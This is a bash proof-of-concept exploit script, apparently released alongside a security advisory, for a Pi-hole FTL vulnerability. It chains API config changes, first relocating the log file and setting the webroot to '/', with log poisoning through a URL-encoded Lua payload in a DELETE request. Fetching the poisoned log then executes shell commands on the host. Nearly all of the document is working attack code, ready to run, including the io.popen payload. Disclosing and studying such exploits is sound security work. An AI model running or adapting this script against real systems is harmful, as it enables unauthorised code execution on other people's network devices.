#!/bin/bash
#
# LinnemanLabs - pi-hole webroot+serve_all+logpoison PoC, web session to code exec
#
# https://linnemanlabs.com/posts/pi-hole-root-with-extra-steps/
# https://github.com/linnemanlabs/advisories/
#
# https://github.com/pi-hole/FTL/security/advisories/GHSA-gx63-h4w6-f46g
#
# configuration options that are able to be set via API let the webroot
# point to an alternative path to execute our own .lp files.
#
# API: log paths -> webserver paths -> error log write -> GET x.lp -> exec
#
# FTL unpatched as of 6.7.1
# fix is in HEAD, should be patched in >= 6.7.2
#
PIPASS="password"
PIHOST="http://pi.hole"
PAYLOAD='<?lua mg.write(io.popen("hostname;uptime;id;grep ^Cap /proc/self/status;pihole version;"):read("*a")) ?>'
do_cleanup=false

while (($#)); do
    case $1 in
        --cleanup) do_cleanup=true ;;
        *) printf 'unknown argument: %s\n' "$1" >&2; exit 2 ;;
    esac
    shift
done

if [ "${do_cleanup}" == "true" ];then
  trap do_cleanup EXIT
else
  echo "Skipping cleanup: to enable run with --cleanup"
fi

do_cleanup() {
  # clean-up
  echo "[*] cleaning up"

  # restore config
  webserverOpts='{"paths":{"webroot":"/var/www/html"},"serve_all":false}'
  echo "[*] restoring webserver paths and serve_all"
  res="$( curl -sk "${AUTH[@]}" -X PATCH ${PIHOST}/api/config -H "Content-Type: application/json" \
      -d "{\"config\":{\"webserver\":${webserverOpts}}}" )"
  resoptwr="$( echo "${res}" | jq -r ".config.webserver.paths.webroot" )"
  resoptsa="$( echo "${res}" | jq -r ".config.webserver.serve_all" )"
  if [ "${resoptwr}" == "/var/www/html" ];then
    echo "[+] pihole restored webroot config"
  else
    printf "[-] pihole did not restore webroot config option.\n[-] config.webserver.paths.webroot: ${resoptwr}\n[-] full response: ${res}\n"
  fi

  if [ "${resoptsa}" == "false" ];then
    echo "[+] pihole restored serve_all config"
  else
    printf "[-] pihole did not restore serve_all config option.\n[-] config.webserver.paths.webroot: ${resoptsa}\n[-] full response: ${res}\n"
  fi
  echo "[*] clean-up finished"

  echo "[*] Restoring log file locations"
  res="$( curl -sk "${AUTH[@]}" -X PATCH ${PIHOST}/api/config -H "Content-Type: application/json" \
      -d '{"config":{"files":{"log":{"ftl":"/var/log/pihole/FTL.log","webserver":"/var/log/pihole/webserver.log"}}}}' )"
  resoptftl="$( echo "${res}" | jq -r ".config.files.log.ftl" )"
  resoptwsl="$( echo "${res}" | jq -r ".config.files.log.webserver" )"
  if [ "${resoptwsl}" == "/var/log/pihole/webserver.log" ];then
    echo "[+] pihole restored our webserver log file change"
  else
    printf "[-] pihole did not restore our FTL log file config option.\n[-] config.files.log.webserver: ${resoptwsl}\n[-] full response: ${res}\n"
  fi

  if [ "${resoptftl}" == "/var/log/pihole/FTL.log" ];then
    echo "[+] pihole restored FTL log file change"
  else
    printf "[-] pihole did not restore our FTL log file config option.\n[-] config.files.log.ftl: ${resoptftl}\n[-] full response: ${res}\n"
  fi

  echo "[*] clean-up finished"
}

# authenticate (get a session id)
if [ "${PIPASS}x" != "x" ]; then
  SID="$( curl -sk -X POST ${PIHOST}/api/auth -H 'Content-Type: application/json' -d "{\"password\":\"${PIPASS}\"}" | jq -r .session.sid )"
  if [ "${SID}x" == "x" ];then
    echo "[-] cant create session with ${PIHOST} - is host up and password correct?"
    exit 1
  fi
  # using header auth, no CSRF token needed
  AUTH=(-H "X-FTL-SID: $SID")
  echo "[*] logged in, sid=${SID:0:8}…"
else
  AUTH=()
  echo "[*] using no-password mode"
fi

# change log file paths
echo "[*] Setting FTL and webserver log file locations"
res="$( curl -sk "${AUTH[@]}" -X PATCH ${PIHOST}/api/config -H "Content-Type: application/json" \
    -d '{"config":{"files":{"log":{"ftl":"/etc/pihole/x.lp","webserver":""}}}}' )"
resoptftl="$( echo "${res}" | jq -r ".config.files.log.ftl" )"
resoptwsl="$( echo "${res}" | jq -r ".config.files.log.webserver" )"
if [ "${resoptwsl}" == "" ];then
  echo "[+] pihole loaded our webserver log file change"
else
  printf "[-] pihole did not set our FTL log file config option.\n[-] config.files.log.webserver: ${resoptwsl}\n[-] full response: ${res}\n"
  exit 1
fi

if [ "${resoptftl}" == "/etc/pihole/x.lp" ];then
  echo "[+] pihole loaded our FTL log file change"
else
  printf "[-] pihole did not set our FTL log file config option.\n[-] config.files.log.ftl: ${resoptftl}\n[-] full response: ${res}\n"
  exit 1
fi

# set webroot to /
res="$( curl -sk "${AUTH[@]}" -X PATCH ${PIHOST}/api/config -H "Content-Type: application/json" \
    -d '{"config":{"webserver":{"paths":{"webroot":"/"},"serve_all":true}}}' )"
resoptwr="$( echo "${res}" | jq -r ".config.webserver.paths.webroot" )"
resoptsa="$( echo "${res}" | jq -r ".config.webserver.serve_all" )"
if [ "${resoptwr}" == "/" ];then
  echo "[+] pihole loaded our webroot config"
else
  printf "[-] pihole did not set our webroot config option.\n[-] config.webserver.paths.webroot: ${resoptwr}\n[-] full response: ${res}\n"
  exit 1
fi

echo "[*] sleeping for 5s to give FTL time to reload..";sleep 5

enclua=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$PAYLOAD")
echo "[*] sending DELETE request to get our <?lua ... ?> logged unescaped"
res="$( curl -sk "${AUTH[@]}" -X DELETE "${PIHOST}/api/info/messages/${enclua}" -o /dev/null -w '%{http_code}\n' )"
if [ "${res}" == "404" ];then
  echo "[+] DELETE sent, 404 means it should (might?) be logged"
else
  echo "[-] DELETE sent, not the 404 response we expected: res: ${res}"
fi

echo "[*] checking if our lua worked"
# grep -A 20 in case you send lots of unrelated log lines over time
# my default payload prints 20 lines
reslog="$( curl -sk "${PIHOST}/etc/pihole/x" | grep -A 20 WARNING )"
echo "[*] result: ${reslog}"
